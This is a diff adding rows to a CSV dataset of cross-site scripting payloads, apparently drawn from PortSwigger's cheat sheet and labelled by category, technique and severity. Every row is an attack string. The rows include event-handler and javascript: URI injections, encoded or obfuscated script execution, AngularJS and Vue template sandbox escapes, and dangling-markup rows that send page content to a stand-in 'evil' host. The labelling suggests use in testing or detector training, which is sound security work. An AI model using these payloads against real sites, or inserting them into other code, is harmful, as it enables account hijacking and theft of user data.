+"<form><input onclick=""formAction=top.name,type='submit',new submit"">",event_handler,restricted_chars,medium,68,portswigger
+"<svg onload=innerHTML=URL,innerHTML=textContent>",event_handler,restricted_chars,high,48,portswigger
+"<img/src/onerror=innerHTML=URL,innerHTML=textContent>",event_handler,restricted_chars,high,53,portswigger
+"<svg onload=innerHTML=URL,eval(textContent)>",dom_sink,restricted_chars,high,44,portswigger
+<xss class=progress-bar-animated onanimationstart=alert(1)>,event_handler,event_handler,high,59,portswigger
+"<xss class=""carousel slide"" data-ride=carousel data-interval=100 ontransitionend=alert(1)><xss class=carousel-inner><xss class=""carousel-item active""></xss><xss class=carousel-item></xss></xss></xss>",attribute,event_handler,medium,199,portswigger
+"<iframe src=""javascript:alert(1)"">",js_uri,protocol,medium,34,portswigger
+"<a href=""javascript:alert(1)"">XSS</a>",js_uri,protocol,medium,37,portswigger
+"<a href=""JaVaScript:alert(1)"">XSS</a>",js_uri,protocol,medium,37,portswigger
+"<a href="" 	javascript:alert(1)"">XSS</a>",js_uri,protocol,medium,39,portswigger
+"<a href=""javas	cript:alert(1)"">XSS</a>",js_uri,tag_injection,medium,38,portswigger
+"<a href=""javascript
+:alert(1)"">XSS</a>",js_uri,tag_injection,medium,38,portswigger
+"<svg><a xlink:href=""javascript:alert(1)""><text x=""20"" y=""20"">XSS</text></a>",js_uri,protocol,medium,75,portswigger
+<svg><animate xlink:href=#xss attributeName=href values=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>,js_uri,protocol,medium,118,portswigger
+<svg><animate xlink:href=#xss attributeName=href from=javascript:alert(1) to=1 /><a id=xss><text x=20 y=20>XSS</text></a>,js_uri,protocol,medium,121,portswigger
+<svg><set xlink:href=#x attributeName=href to=javascript:alert(1) /><a id=x><text x=20 y=20>XSS</text></a>,js_uri,protocol,medium,106,portswigger
+"<script src=""data:text/javascript,alert(1)""></script>",script_injection,script_tag,high,53,portswigger
+"<svg><script href=""data:text/javascript,alert(1)"" />",js_uri,script_tag,high,52,portswigger
+"<script>import('data:text/javascript,alert(1)')</script>",script_injection,script_tag,high,56,portswigger
+"<math><x href=""javascript:alert(1)"">blah",js_uri,protocol,medium,40,portswigger
+<form><button formaction=javascript:alert(1)>XSS,js_uri,protocol,medium,48,portswigger
+<form><input type=submit formaction=javascript:alert(1) value=XSS>,js_uri,protocol,medium,66,portswigger
+<form action=javascript:alert(1)><input type=submit value=XSS>,js_uri,protocol,medium,62,portswigger
+"<svg><animate xlink:href=#xss attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values=""https://portswigger.net?&semi;javascript:alert(1)&semi;0"" /><a id=xss><text x=20 y=20>XSS</text></a>",js_uri,obfuscation,medium,202,portswigger
+<embed code=https://portswigger-labs.net width=500 height=500 type=text/html>,js_uri,obfuscation,medium,77,portswigger
+<object width=500 height=500 type=text/html><param name=url value=https://portswigger-labs.net>,js_uri,obfuscation,medium,95,portswigger
+<object width=500 height=500 type=text/html><param name=code value=https://portswigger-labs.net>,js_uri,obfuscation,medium,96,portswigger
+<object width=500 height=500 type=text/html><param name=movie value=https://portswigger-labs.net>,js_uri,obfuscation,medium,97,portswigger
+<object width=500 height=500 type=text/html><param name=src value=https://portswigger-labs.net>,js_uri,obfuscation,medium,95,portswigger
+<script>navigation.navigate('javascript:alert(1)')</script>,script_injection,script_tag,high,59,portswigger
+"<iframe srcdoc=""<img src=1 onerror=alert(1)>""></iframe>",attribute,event_handler,high,55,portswigger
+"<iframe srcdoc=""&lt;img src=1 onerror=alert(1)&gt;""></iframe>",attribute,event_handler,high,61,portswigger
+"<form action=""javascript:alert(1)""><input type=submit id=x></form><label for=x>XSS</label>",tag_injection,protocol,low,90,portswigger
+"<input type=""hidden"" accesskey=""X"" onclick=""alert(1)""> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)",attribute,event_handler,medium,106,portswigger
+"<link rel=""canonical"" accesskey=""X"" onclick=""alert(1)"" /> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)",attribute,event_handler,medium,109,portswigger
+"<a href=# download=""filename.html"">Test</a>",tag_injection,tag_injection,low,43,portswigger
+"<img referrerpolicy=""no-referrer"" src=""//portswigger-labs.net"">",tag_injection,obfuscation,low,63,portswigger
+"<a href=# onclick=""window.open('http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//','alert(1)')"">XSS</a>",dom_sink,obfuscation,medium,148,portswigger
+"<iframe name=""alert(1)"" src=""https://portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//""></iframe>",dom_sink,obfuscation,medium,124,portswigger
+"<base target=""alert(1)""><a href=""http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//"">XSS via target in base tag</a>",dom_sink,obfuscation,medium,159,portswigger
+"<a target=""alert(1)"" href=""http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//"">XSS via target in a tag</a>",dom_sink,obfuscation,medium,150,portswigger
+"<img src=""validimage.png"" width=""10"" height=""10"" usemap=""#xss""><map name=""xss""><area shape=""rect"" coords=""0,0,82,126"" target=""alert(1)"" href=""http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//""></map>",dom_sink,obfuscation,medium,244,portswigger
+"<form action=""http://subdomain1.portswigger-labs.net/xss/xss.php"" target=""alert(1)""><input type=hidden name=x value=""';eval(name)//""><input type=hidden name=context value=js_string_single><input type=""submit"" value=""XSS via target in a form""></form>",dom_sink,obfuscation,medium,249,portswigger
+"<form><input type=hidden name=x value=""';eval(name)//""><input type=hidden name=context value=js_string_single><input type=""submit"" formaction=""http://subdomain1.portswigger-labs.net/xss/xss.php"" formtarget=""alert(1)"" value=""XSS via formtarget in input type submit""></form>",dom_sink,obfuscation,medium,272,portswigger
+"<form><input type=hidden name=x value=""';eval(name)//""><input type=hidden name=context value=js_string_single><input name=1 type=""image"" src=""validimage.png"" formaction=""http://subdomain1.portswigger-labs.net/xss/xss.php"" formtarget=""alert(1)"" value=""XSS via formtarget in input type image""></form>",dom_sink,obfuscation,medium,298,portswigger
+"<meta http-equiv=""refresh"" content=""0; url=//portswigger-labs.net"">",attribute,obfuscation,medium,67,portswigger
+"<meta charset=""UTF-7"" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4-",tag_injection,tag_injection,low,66,portswigger
+"<meta http-equiv=""Content-Type"" content=""text/html; charset=UTF-7"" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4-",attribute,event_handler,medium,111,portswigger
+"+/v8
++ADw-script+AD4-alert(1)+ADw-/script+AD4-",tag_injection,none,low,46,portswigger
+"+/v9
++ADw-script+AD4-alert(1)+ADw-/script+AD4-",tag_injection,none,low,46,portswigger
+"+/v+
++ADw-script+AD4-alert(1)+ADw-/script+AD4-",tag_injection,none,low,46,portswigger
+"+/v/
++ADw-script+AD4-alert(1)+ADw-/script+AD4-",tag_injection,none,low,46,portswigger
+"<meta http-equiv=""Content-Security-Policy"" content=""upgrade-insecure-requests"">",attribute,event_handler,medium,79,portswigger
+"<iframe sandbox src=""//portswigger-labs.net""></iframe>",tag_injection,obfuscation,low,54,portswigger
+"<meta name=""referrer"" content=""no-referrer"">",attribute,event_handler,medium,44,portswigger
+"%C0%BCscript>alert(1)</script>
+%E0%80%BCscript>alert(1)</script>
+%F0%80%80%BCscript>alert(1)</script>
+%F8%80%80%80%BCscript>alert(1)</script>
+%FC%80%80%80%80%BCscript>alert(1)</script>",attribute_escape,encoding,medium,184,portswigger
+<script>\u0061lert(1)</script>,script_injection,encoding,high,30,portswigger
+<script>\u{61}lert(1)</script>,script_injection,encoding,high,30,portswigger
+<script>\u{0000000061}lert(1)</script>,script_injection,encoding,high,38,portswigger
+<script>eval('\x61lert(1)')</script>,dom_sink,encoding,high,36,portswigger
+"<script>eval('\141lert(1)')</script>
+<script>eval('alert(\061)')</script>
+<script>eval('alert(\61)')</script>",dom_sink,encoding,high,109,portswigger
+"<a href=""&#106;avascript:alert(1)"">XSS</a><a href=""&#106avascript:alert(1)"">XSS</a>",attribute_escape,encoding,medium,83,portswigger
+"<svg><script>&#97;lert(1)</script></svg>
+<svg><script>&#x61;lert(1)</script></svg>
+<svg><script>alert&NewLine;(1)</script></svg>
+<svg><script>x=""&quot;,alert(1)//"";</script></svg>",script_injection,encoding,high,179,portswigger
+"<a href=""&#0000106avascript:alert(1)"">XSS</a>",attribute_escape,encoding,medium,45,portswigger
+"<a href=""&#x6a;avascript:alert(1)"">XSS</a>",attribute_escape,encoding,medium,42,portswigger
+"<a href=""j&#x61vascript:alert(1)"">XSS</a>
+<a href=""&#x6a
+avascript:alert(1)"">XSS</a>
+<a href=""&#x6a avascript:alert(1)"">XSS</a>",attribute_escape,encoding,medium,127,portswigger
+"<a href=""&#x0000006a;avascript:alert(1)"">XSS</a>",attribute_escape,encoding,medium,48,portswigger
+"<a href=""&#X6A;avascript:alert(1)"">XSS</a>",attribute_escape,encoding,medium,42,portswigger
+"<a href=""javascript&colon;alert(1)"">XSS</a>
+<a href=""java&Tab;script:alert(1)"">XSS</a>
+<a href=""java&NewLine;script:alert(1)"">XSS</a>
+<a href=""javascript&colon;alert&lpar;1&rpar;"">XSS</a>",attribute_escape,encoding,medium,187,portswigger
+"<a href=""javascript:x='%27-alert(1)-%27';"">XSS</a>",attribute_escape,encoding,medium,50,portswigger
+"<a href=""javascript:x='&percnt;27-alert(1)-%27';"">XSS</a>",attribute_escape,encoding,medium,57,portswigger
+"<script src=data:text/javascript;base64,YWxlcnQoMSk=></script>",script_injection,obfuscation,high,62,portswigger
+"<script src=data:text/javascript;base64,&#x59;&#x57;&#x78;&#x6c;&#x63;&#x6e;&#x51;&#x6f;&#x4d;&#x53;&#x6b;&#x3d;></script>",script_injection,obfuscation,high,122,portswigger
+"<script src=data:text/javascript;base64,%59%57%78%6c%63%6e%51%6f%4d%53%6b%3d></script>",script_injection,obfuscation,high,86,portswigger
+<iframe srcdoc=&lt;script&gt;alert&lpar;1&rpar;&lt;&sol;script&gt;></iframe>,attribute_escape,obfuscation,medium,76,portswigger
+"<iframe src=""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""></iframe>",attribute_escape,obfuscation,medium,247,portswigger
+<svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg>,script_injection,obfuscation,high,211,portswigger
+<img src=x onerror=location=atob`amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21haW4p`>,event_handler,obfuscation,high,79,portswigger
+{{constructor.constructor('alert(1)')()}},template_injection,template,medium,41,portswigger
+"<div v-html=""''.constructor.constructor('alert(1)')()"">a</div>",template_injection,template,medium,62,portswigger
+<x v-html=_c.constructor('alert(1)')()>,template_injection,template,medium,39,portswigger
+<x v-if=_c.constructor('alert(1)')()>,template_injection,template,medium,37,portswigger
+{{_c.constructor('alert(1)')()}},template_injection,template,medium,32,portswigger
+{{_v.constructor('alert(1)')()}},template_injection,template,medium,32,portswigger
+{{_s.constructor('alert(1)')()}},template_injection,template,medium,32,portswigger
+"<p v-show=""_c.constructor`alert(1)`()"">",template_injection,template,medium,39,portswigger
+<x v-on:click='_b.constructor`alert(1)`()'>click</x>,template_injection,template,medium,52,portswigger
+<x v-bind:a='_b.constructor`alert(1)`()'>,template_injection,template,medium,41,portswigger
+<x @[_b.constructor`alert(1)`()]>,template_injection,template,medium,33,portswigger
+<x :[_b.constructor`alert(1)`()]>,template_injection,template,medium,33,portswigger
+<p v-=_c.constructor`alert(1)`()>,template_injection,template,medium,33,portswigger
+<x #[_c.constructor`alert(1)`()]>,template_injection,template,medium,33,portswigger
+<p :=_c.constructor`alert(1)`()>,template_injection,template,medium,32,portswigger
+{{_b.constructor`alert(1)`()}},template_injection,template,medium,30,portswigger
+"<x v-bind:is=""'script'"" src=""//14.rs"" />",template_injection,template,medium,40,portswigger
+<x is=script src=//⑭.₨>,template_injection,template,medium,23,portswigger
+<x @click='_b.constructor`alert(1)`()'>click</x>,template_injection,template,medium,48,portswigger
+"<x title""=""&lt;iframe&Tab;onload&Tab;=alert(1)&gt;"">",template_injection,template,medium,52,portswigger
+"<x title""=""&lt;iframe&Tab;onload&Tab;=setTimeout(/alert(1)/.source)&gt;"">",dom_sink,template,medium,73,portswigger
+<xyz<img/src onerror=alert(1)>>,event_handler,template,high,31,portswigger
+<svg><svg><b><noscript>&lt;/noscript&gt;&lt;iframe&Tab;onload=setTimeout(/alert(1)/.source)&gt;</noscript></b></svg>,dom_sink,template,high,116,portswigger
+"<a @['c\lic\u{6b}']=""_c.constructor('alert(1)')()"">test</a>",template_injection,template,medium,59,portswigger
+{{$el.ownerDocument.defaultView.alert(1)}},template_injection,template,medium,42,portswigger
+{{$el.innerHTML='\u003cimg src onerror=alert(1)\u003e'}},template_injection,template,high,56,portswigger
+<img src @error=e=$event.path.pop().alert(1)>,template_injection,template,medium,45,portswigger
+<img src @error=e=$event.composedPath().pop().alert(1)>,template_injection,template,medium,55,portswigger
+<img src @error=this.alert(1)>,template_injection,template,medium,30,portswigger
+<svg@load=this.alert(1)>,template_injection,template,medium,24,portswigger
+"<p slot-scope=""){}}])+this.constructor.constructor('alert(1)')()})};//"">",template_injection,template,medium,72,portswigger
+{{_openBlock.constructor('alert(1)')()}},template_injection,template,medium,40,portswigger
+{{_createBlock.constructor('alert(1)')()}},template_injection,template,medium,42,portswigger
+{{_toDisplayString.constructor('alert(1)')()}},template_injection,template,medium,46,portswigger
+{{_createVNode.constructor('alert(1)')()}},template_injection,template,medium,42,portswigger
+<p v-show=_createBlock.constructor`alert(1)`()>,template_injection,template,medium,47,portswigger
+<x @[_openBlock.constructor`alert(1)`()]>,template_injection,template,medium,41,portswigger
+<x @[_capitalize.constructor`alert(1)`()]>,template_injection,template,medium,42,portswigger
+<x @click=_withCtx.constructor`alert(1)`()>click</x>,template_injection,template,medium,52,portswigger
+<x @click=$event.view.alert(1)>click</x>,template_injection,template,medium,40,portswigger
+{{_Vue.h.constructor`alert(1)`()}},template_injection,template,medium,34,portswigger
+{{$emit.constructor`alert(1)`()}},template_injection,template,medium,33,portswigger
+<teleport to=script:nth-child(2)>alert&lpar;1&rpar;</teleport></div><script></script>,script_injection,template,high,85,portswigger
+<component is=script text=alert(1)>,template_injection,template,medium,35,portswigger
+{{$on.constructor('alert(1)')()}},template_injection,template,medium,33,portswigger
+"{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}",template_injection,template,medium,122,portswigger
+"{{{}."")));alert(1)//""}}",template_injection,template,medium,23,portswigger
+"{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}",template_injection,template,medium,106,portswigger
+"{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[""a"",""alert(1)""].sort(toString.constructor);}}",template_injection,template,medium,124,portswigger
+"{{!ready && (ready = true) && (
+!call
+? $$watchers[0].get(toString.constructor.prototype)
+: (a = apply) &&
+(apply = constructor) &&
+(valueOf = call) &&
+(''+''.toString(
+'F = Function.prototype;' +
+'F.apply = F.a;' +
+'delete F.a;' +
+'delete F.valueOf;' +
+'alert(1);'
+)));}}",template_injection,template,medium,272,portswigger
+"{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)//');}}",template_injection,template,medium,128,portswigger
+"{{'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;$eval('x=alert(1)//');}}",template_injection,template,medium,102,portswigger
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}},template_injection,template,medium,65,portswigger
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}},template_injection,template,medium,74,portswigger
+{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}},template_injection,template,medium,79,portswigger
+"{{
+c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
+c.$apply=$apply;c.$eval=b;op=$root.$$phase;
+$root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
+C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
+B=C(b,c,b);$evalAsync(""
+astNode=pop();astNode.type='UnaryExpression';
+astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';
+astNode.argument={type:'Identifier',name:'foo'};
+"");
+m1=B($$asyncQueue.pop().expression,null,$root);
+m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
+$eval('a(b.c)');[].push.apply=a;
+}}",template_injection,template,medium,517,portswigger
+"{{c=''.sub.call;b=''.sub.bind;c.$apply=$apply;c.$eval=b;$root.$$phase=null;$root.$digest=$on; C=c.$apply(c);B=C(b,c,b);$evalAsync(""astNode=pop();astNode.type='UnaryExpression';astNode.operator='alert(1)';astNode.argument={type:'Identifier'};"");m1=$$asyncQueue.pop().expression;m2=B(C,null,m1);[].push.apply=m2;$eval('B(b)');}}",template_injection,template,medium,326,portswigger
+constructor.constructor('alert(1)')(),template_injection,template,medium,37,portswigger
+"a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()",template_injection,template,medium,118,portswigger
+"toString.constructor.prototype.toString=toString.constructor.prototype.call;[""a"",""alert(1)""].sort(toString.constructor)",template_injection,template,medium,119,portswigger
+"{}[['__proto__']]['x']=constructor.getOwnPropertyDescriptor;g={}[['__proto__']]['x'];{}[['__proto__']]['y']=g(''.sub[['__proto__']],'constructor');{}[['__proto__']]['z']=constructor.defineProperty;d={}[['__proto__']]['z'];d(''.sub[['__proto__']],'constructor',{value:false});{}[['__proto__']]['y'].value('alert(1)')()",template_injection,template,medium,317,portswigger
+"{}."")));alert(1)//"";",template_injection,template,medium,20,portswigger
+'a'.constructor.prototype.charAt=[].join;[1]|orderBy:'x=1} } };alert(1)//';,template_injection,template,medium,75,portswigger
+{y:''.constructor.prototype}.y.charAt=[].join;[1]|orderBy:'x=alert(1)',template_injection,template,medium,70,portswigger
+"toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)",template_injection,template,medium,134,portswigger
+"<input autofocus ng-focus=""$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"">",template_injection,template,high,91,portswigger
+<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'>,template_injection,template,medium,66,portswigger
+"<div ng-app ng-csp><div ng-focus=""x=$event;"" id=f tabindex=0>foo</div><div ng-repeat=""(key, value) in x.view""><div ng-if=""key == 'window'"">{{ [1].reduce(value.alert, 1); }}</div></div></div>",template_injection,template,medium,190,portswigger
+<input ng-cut=$event.composedPath()|orderBy:'(y=alert)(1)'>,template_injection,template,medium,59,portswigger
+"<body background=""//evil?
+<table background=""//evil?
+<table><thead background=""//evil?
+<table><tbody background=""//evil?
+<table><tfoot background=""//evil?
+<table><td background=""//evil?
+<table><th background=""//evil?",tag_injection,obfuscation,low,216,portswigger
+"<link rel=stylesheet href=""//evil?",tag_injection,obfuscation,low,34,portswigger
+"<link rel=icon href=""//evil?",tag_injection,obfuscation,low,28,portswigger
+"<meta http-equiv=""refresh"" content=""0; http://evil?",attribute,obfuscation,medium,51,portswigger
+"<img src=""//evil?
+<image src=""//evil?",tag_injection,obfuscation,low,37,portswigger
+"<video><track default src=""//evil?",tag_injection,obfuscation,low,34,portswigger
+"<video><source src=""//evil?",tag_injection,obfuscation,low,27,portswigger
+"<audio><source src=""//evil?",tag_injection,obfuscation,low,27,portswigger
+"<input type=image src=""//evil?",tag_injection,obfuscation,low,30,portswigger
+"<form><button style=""width:100%;height:100%"" type=submit formaction=""//evil?",tag_injection,obfuscation,low,76,portswigger
+"<form><input type=submit value=""XSS"" style=""width:100%;height:100%"" type=submit formaction=""//evil?",tag_injection,obfuscation,low,99,portswigger
+"<button form=x style=""width:100%;height:100%;""><form id=x action=""//evil?",tag_injection,obfuscation,low,73,portswigger
+"<object data=""//evil?",tag_injection,obfuscation,low,21,portswigger
+"<iframe src=""//evil?",tag_injection,obfuscation,low,20,portswigger
+"<embed src=""//evil?",tag_injection,obfuscation,low,19,portswigger
+<form><button formaction=//evil>XSS</button><textarea name=x>,tag_injection,obfuscation,low,61,portswigger
+<button form=x>XSS</button><form id=x action=//evil target=',tag_injection,obfuscation,low,60,portswigger
+"<a href=http://subdomain1.portswigger-labs.net/dangling_markup/name.html><font size=100 color=red>You must click me</font></a><base target=""",tag_injection,obfuscation,low,140,portswigger
+"<form><input type=submit value=""Click me"" formaction=http://subdomain1.portswigger-labs.net/dangling_markup/name.html formtarget=""",tag_injection,obfuscation,low,130,portswigger
+"<a href=abc style=""width:100%;height:100%;position:absolute;font-size:1000px;"">xss<base href=""//evil/",tag_injection,obfuscation,low,101,portswigger
+"<embed src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=""",tag_injection,obfuscation,low,82,portswigger
+"<iframe src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=""",tag_injection,obfuscation,low,83,portswigger
+"<object data=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=""",tag_injection,obfuscation,low,84,portswigger
+"<frameset><frame src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=""",tag_injection,obfuscation,low,92,portswigger
+"<input type=hidden type=image src=""//evil?",tag_injection,obfuscation,low,42,portswigger
+"<video poster=""//evil?",tag_injection,obfuscation,low,22,portswigger
+"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+alert(1)//'>",js_uri,obfuscation,high,112,portswigger
+"javascript:""/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \""
+ onmouseover=/*&lt;svg/*/onload=alert()//>",js_uri,obfuscation,high,142,portswigger
+"javascript:/*--></title></style></textarea></script></xmp><details/open/ontoggle='+/`/+/""/+/onmouseover=1/+/[*/[]/+alert(/@PortSwiggerRes/)//'>",js_uri,obfuscation,high,143,portswigger
+';window['ale'+'rt'](window['doc'+'ument']['dom'+'ain']);//,attribute_escape,obfuscation,medium,59,portswigger
+';self['ale'+'rt'](self['doc'+'ument']['dom'+'ain']);//,attribute_escape,obfuscation,medium,55,portswigger
+';this['ale'+'rt'](this['doc'+'ument']['dom'+'ain']);//,attribute_escape,obfuscation,medium,55,portswigger
+';top['ale'+'rt'](top['doc'+'ument']['dom'+'ain']);//,attribute_escape,obfuscation,medium,53,portswigger
+';parent['ale'+'rt'](parent['doc'+'ument']['dom'+'ain']);//,attribute_escape,obfuscation,medium,59,portswigger
+';frames['ale'+'rt'](frames['doc'+'ument']['dom'+'ain']);//,attribute_escape,obfuscation,medium,59,portswigger
+';globalThis['ale'+'rt'](globalThis['doc'+'ument']['dom'+'ain']);//,attribute_escape,obfuscation,medium,67,portswigger
+';window[/*foo*/'alert'/*bar*/](window[/*foo*/'document'/*bar*/]['domain']);//,attribute_escape,obfuscation,medium,78,portswigger
+';self[/*foo*/'alert'/*bar*/](self[/*foo*/'document'/*bar*/]['domain']);//,attribute_escape,obfuscation,medium,74,portswigger
+';this[/*foo*/'alert'/*bar*/](this[/*foo*/'document'/*bar*/]['domain']);//,attribute_escape,obfuscation,medium,74,portswigger
+';top[/*foo*/'alert'/*bar*/](top[/*foo*/'document'/*bar*/]['domain']);//,attribute_escape,obfuscation,medium,72,portswigger
+';parent[/*foo*/'alert'/*bar*/](parent[/*foo*/'document'/*bar*/]['domain']);//,attribute_escape,obfuscation,medium,78,portswigger
+';frames[/*foo*/'alert'/*bar*/](frames[/*foo*/'document'/*bar*/]['domain']);//,attribute_escape,obfuscation,medium,78,portswigger
+';globalThis[/*foo*/'alert'/*bar*/](globalThis[/*foo*/'document'/*bar*/]['domain']);//,attribute_escape,obfuscation,medium,86,portswigger
+';window['\x61\x6c\x65\x72\x74'](window['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//,attribute_escape,encoding,medium,107,portswigger
+';self['\x61\x6c\x65\x72\x74'](self['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//,attribute_escape,encoding,medium,103,portswigger
+';this['\x61\x6c\x65\x72\x74'](this['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//,attribute_escape,encoding,medium,103,portswigger
+';top['\x61\x6c\x65\x72\x74'](top['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//,attribute_escape,encoding,medium,101,portswigger
+';parent['\x61\x6c\x65\x72\x74'](parent['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//,attribute_escape,encoding,medium,107,portswigger
+';frames['\x61\x6c\x65\x72\x74'](frames['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//,attribute_escape,encoding,medium,107,portswigger
+';globalThis['\x61\x6c\x65\x72\x74'](globalThis['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//,attribute_escape,encoding,medium,115,portswigger
+"';window['\x65\x76\x61\x6c']('window[""\x61\x6c\x65\x72\x74""](window[""\x61\x74\x6f\x62""](""WFNT""))');//",attribute_escape,encoding,medium,101,portswigger
+"';self['\x65\x76\x61\x6c']('self[""\x61\x6c\x65\x72\x74""](self[""\x61\x74\x6f\x62""](""WFNT""))');//",attribute_escape,encoding,medium,95,portswigger
+"';this['\x65\x76\x61\x6c']('this[""\x61\x6c\x65\x72\x74""](this[""\x61\x74\x6f\x62""](""WFNT""))');//",attribute_escape,encoding,medium,95,portswigger
+"';top['\x65\x76\x61\x6c']('top[""\x61\x6c\x65\x72\x74""](top[""\x61\x74\x6f\x62""](""WFNT""))');//",attribute_escape,encoding,medium,92,portswigger
+"';parent['\x65\x76\x61\x6c']('parent[""\x61\x6c\x65\x72\x74""](parent[""\x61\x74\x6f\x62""](""WFNT""))');//",attribute_escape,encoding,medium,101,portswigger
+"';frames['\x65\x76\x61\x6c']('frames[""\x61\x6c\x65\x72\x74""](frames[""\x61\x74\x6f\x62""](""WFNT""))');//",attribute_escape,encoding,medium,101,portswigger
+"';globalThis['\x65\x76\x61\x6c']('globalThis[""\x61\x6c\x65\x72\x74""](globalThis[""\x61\x74\x6f\x62""](""WFNT""))');//",attribute_escape,encoding,medium,113,portswigger
+';window['\141\154\145\162\164']('\130\123\123');//,attribute_escape,obfuscation,medium,51,portswigger
+';self['\141\154\145\162\164']('\130\123\123');//,attribute_escape,obfuscation,medium,49,portswigger
+';this['\141\154\145\162\164']('\130\123\123');//,attribute_escape,obfuscation,medium,49,portswigger
+';top['\141\154\145\162\164']('\130\123\123');//,attribute_escape,obfuscation,medium,48,portswigger
+';parent['\141\154\145\162\164']('\130\123\123');//,attribute_escape,obfuscation,medium,51,portswigger
+';frames['\141\154\145\162\164']('\130\123\123');//,attribute_escape,obfuscation,medium,51,portswigger
+';globalThis['\141\154\145\162\164']('\130\123\123');//,attribute_escape,obfuscation,medium,55,portswigger
+';window['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//,attribute_escape,encoding,medium,83,portswigger
+';self['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//,attribute_escape,encoding,medium,81,portswigger
+';this['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//,attribute_escape,encoding,medium,81,portswigger
+';top['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//,attribute_escape,encoding,medium,80,portswigger
+';parent['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//,attribute_escape,encoding,medium,83,portswigger
+';frames['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//,attribute_escape,encoding,medium,83,portswigger
+';globalThis['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//,attribute_escape,encoding,medium,87,portswigger
+';window[/al/.source+/ert/.source](/XSS/.source);//,attribute_escape,obfuscation,medium,51,portswigger
+';self[/al/.source+/ert/.source](/XSS/.source);//,attribute_escape,obfuscation,medium,49,portswigger
+';this[/al/.source+/ert/.source](/XSS/.source);//,attribute_escape,obfuscation,medium,49,portswigger
+';top[/al/.source+/ert/.source](/XSS/.source);//,attribute_escape,obfuscation,medium,48,portswigger
+';parent[/al/.source+/ert/.source](/XSS/.source);//,attribute_escape,obfuscation,medium,51,portswigger
+';frames[/al/.source+/ert/.source](/XSS/.source);//,attribute_escape,obfuscation,medium,51,portswigger
+';globalThis[/al/.source+/ert/.source](/XSS/.source);//,attribute_escape,obfuscation,medium,55,portswigger
